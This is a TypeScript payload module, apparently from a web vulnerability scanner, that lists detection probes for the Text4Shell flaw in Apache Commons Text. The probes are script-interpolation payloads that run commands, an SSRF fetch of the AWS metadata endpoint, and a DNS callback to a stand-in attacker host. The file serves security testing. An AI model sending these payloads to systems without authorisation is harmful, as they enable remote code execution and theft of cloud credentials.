import type { PayloadVariant } from '../types';

export const META = {
  id: 'text4shell',
  family: 'command-injection' as const,
  name: 'Text4Shell (CVE-2022-42889)',
  description: 'Apache Commons Text RCE via script/url/dns interpolation prefix abuse (CVE-2022-42889).',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json', 'header', 'path'],
};

const PROBES = [
  { value: '${script:javascript:java.lang.Runtime.getRuntime().exec(\'id\')}', intent: 'JavaScript interpolation invoking Runtime.exec() for RCE via Text4Shell', signals: ['command-output', 'rce-detected'] },
  { value: '${script:groovy:java.lang.Runtime.getRuntime().exec(\'id\')}', intent: 'Groovy interpolation invoking Runtime.exec() for RCE via Text4Shell', signals: ['command-output', 'rce-detected'] },
  { value: '${url:UTF-8:http://169.254.169.254/latest/meta-data/}', intent: 'URL interpolation fetching AWS metadata endpoint — SSRF via Text4Shell', signals: ['ssrf-detected'] },
  { value: '${dns:address|http://attacker.example/}', intent: 'DNS interpolation for OAST callback via Text4Shell', signals: ['oast-callback-confirmed'] },
  { value: '${script:javascript:java.lang.Runtime.getRuntime().exec(\'sleep 5\')}', intent: 'Time-based blind RCE via JavaScript interpolation in Text4Shell', signals: ['timing-delta'] },
  { value: '${script:javascript:\''.repeat(1) + 'pftest\'}', intent: 'Minimal script interpolation to test parser execution without side effects', signals: ['expression-evaluated'] },
  { value: '${base64Decoder:cGZ0ZXN0}', intent: 'base64Decoder prefix probe — tests which interpolations are enabled', signals: ['expression-evaluated'] },
  { value: '${urlDecoder:pftest}', intent: 'urlDecoder prefix probe — tests URL decoder interpolation availability', signals: ['expression-evaluated'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `text4shell-${i + 1}`,
    family: 'command-injection' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
